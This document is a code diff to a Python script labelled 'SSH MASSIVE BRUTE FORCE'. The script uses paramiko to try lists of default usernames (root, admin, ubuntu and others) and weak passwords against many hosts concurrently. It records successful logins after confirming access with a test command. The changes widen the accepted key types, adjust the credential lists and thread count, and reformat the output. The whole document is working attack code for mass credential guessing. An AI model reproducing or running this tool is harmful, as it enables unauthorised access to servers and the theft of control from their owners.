@@ -11,7 +11,7 @@ banner = """
 / __/ __| || | MASSIVE
 \__ \__ \ __ | BRUTE
 |___/___/_||_| FORCE
-WG
+
 """
 
 print(banner)
@@ -69,7 +69,7 @@ def is_valid_ip(ip):
     except ipaddress.AddressValueError:
         return False
 
-def attempt_ssh_connection(hostname, port, username, password, timeout=10):
+def attempt_ssh_connection(hostname, port, username, password, timeout=12):
     if hostname in skipped_ips:
         return
 
@@ -81,23 +81,23 @@ def attempt_ssh_connection(hostname, port, username, password, timeout=10):
         
         transport = client.get_transport()
         if transport:
-            transport.allowed_key_types = set(["ssh-rsa", "ecdsa-sha2-nistp256", "ssh-ed25519"])
+            transport.allowed_key_types = set(["ssh-rsa", "ecdsa-sha2-nistp256", "ssh-ed25519", "ecdsa-sha2-nistp384", "ecdsa-sha2-nistp521", "rsa-sha2-256", "rsa-sha2-512", "sk-ecdsa-sha2-nistp256@openssh.com", "sk-ssh-ed25519@openssh.com"])
         
         stdin, stdout, stderr = client.exec_command('echo "Connection Test"')
         response = stdout.read()
         if "Connection Test" in response.decode('utf-8'):
-            print(f"{hostname}:{port} {username}:{password} +++ SUCCESS +++")
+            print(f"+ + + + Success + + + + {hostname}:{port} {username}:{password} + + + + Success + + + +")
             successful_connections.append((hostname, port, username, password))
         else:
-            print(f"{hostname}:{port} {username}:{password} Connection not completed")
+            print(f"{hostname}:{port} | {username}:{password} | Connection not completed")
 
     except paramiko.ssh_exception.NoValidConnectionsError as e:
-        print(f"{hostname}:{port} {username}:{password} Unable to connect, skipping IP")
+        print(f"{hostname}:{port} | {username}:{password} | Unable to connect, skipping IP")
         skipped_ips.add(hostname)
     except paramiko.ssh_exception.AuthenticationException as e:
-        print(f"{hostname}:{port} {username}:{password} Authentication failed")
+        print(f"{hostname}:{port} | {username}:{password} | Authentication failed")
     except Exception as e:
-        print(f"{hostname}:{port} {username}:{password} Failed: {e}")
+        print(f"{hostname}:{port} | {username}:{password} | Failed: {e}")
     finally:
         client.close()
 
@@ -120,10 +120,10 @@ else:
 successful_connections = []
 skipped_ips = set()
 
-users = ['root', 'admin', 'user', 'user1', 'test', 'ubuntu', 'adm', 'administrator', 'system', 'sys', 'toor', 'server', 'abc', 'account', 'administrador', 'localadmin', 'webadmin']
-password_list = ['root', 'admin', 'user', 'test', 'ubuntu', 'default', 'password123', 'abc', 'abc123', 'server', 'password', 'guest', 'guest123', 'account', 'backup', 'localadmin', 'webadmin', '123', '1234', '12345', '123456', '12345678', '321', '54321', 'uploader', 'admin123', 'toor', 'P@ssw0rd']
+users = ['root', 'admin', 'user', 'test', 'ubuntu', 'adm', 'administrator', 'system', 'sys', 'toor', 'server', 'localadmin', 'webadmin']
+password_list = ['root', 'admin', 'user', 'test', 'ubuntu', 'default', 'password123', 'abc', 'abc123', 'server', 'password', 'guest', 'guest123', 'account', 'backup', 'localadmin', 'webadmin', '123', '1234', '12345', '123456', '321', '54321', 'uploader', 'admin123', 'toor', 'P@ssw0rd']
 
-max_concurrent_connections = 40
+max_concurrent_connections = 30
 
 with concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent_connections) as executor:
     for user in users:
